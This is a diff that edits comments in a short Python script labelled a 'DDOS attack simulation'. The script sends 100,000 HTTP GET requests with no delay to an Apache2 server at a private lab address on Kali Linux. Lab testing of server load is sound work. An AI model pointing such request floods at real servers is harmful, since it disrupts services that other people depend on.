@@ -1,15 +1,15 @@
-import requests  # for posting  HTTP requests this library requires ( Manual installation required)
-import time     # for adding delays this libray requires 
+import requests  # for posting  HTTP requests this library requires ( Manual installation required via pip)
+import time     # for adding delays this library requires 
 
 def send_request(url, client_id):
-    # Send a request to apache 2 server
-    # This function simulates an IoT device sending data to a apaceh 2 server
+    # Send a request to apache2 server
+    # This function simulates an IoT device sending data to a apache2 server
 
     try:
         # Start counting  time before posting the request to apache2 endpoint 
         start_time = time.time()
         
-        #  Posting http request t to get response  from apache 2 server
+        #  Posting http request to get response  from apache2 server
         # This URL should be the endpoint where the IoT device sends data
         response = requests.get(url)
         
@@ -19,21 +19,21 @@ def send_request(url, client_id):
         # Calculate response time from apache2 server in milliseconds
         response_time = (end_time - start_time) * 1000
     
-        print(f"[Client {client_id}] Status Code: {response.status_code}, Response Time: {response_time:.2f}ms")
+        print(f"[Client {client_id}] Status Code: {response.status_code}, Response Time: {response_time:.2f}ms") # status code, client ID and response time printing
         
     except requests.exceptions.RequestException as e:
-        # Logging error when apache 2 server  fail to process the request
-        print(f"[Client {client_id}] Error: {e}")
+        # Logging error when apache 2 server  fails to process the request
+        print(f"[Client {client_id}] Error: {e}") # Printing error message with client ID
 
 
 # # Test server URL where apache2 is running on KALI Linux
 SERVER_URL = 'http://192.168.65.2/'  
 
-# DDOS attack simulation by flooding 100000 requests to apache2 server. 
+# DDOS attack simulation by flooding 100000 requests to apache2 server without delay 
 NUM_REQUESTS = 100000                
 DELAY = 0                       
 
-# The loop counts from 1 to 10,000 without any delay between requests
+# The loop counts from 1 to 100,000 without any delay between requests
 for request_id in range(1, NUM_REQUESTS + 1):
     send_request(SERVER_URL, request_id)
     # delay between the http requests. in this case no delay since DELAY is set to 0
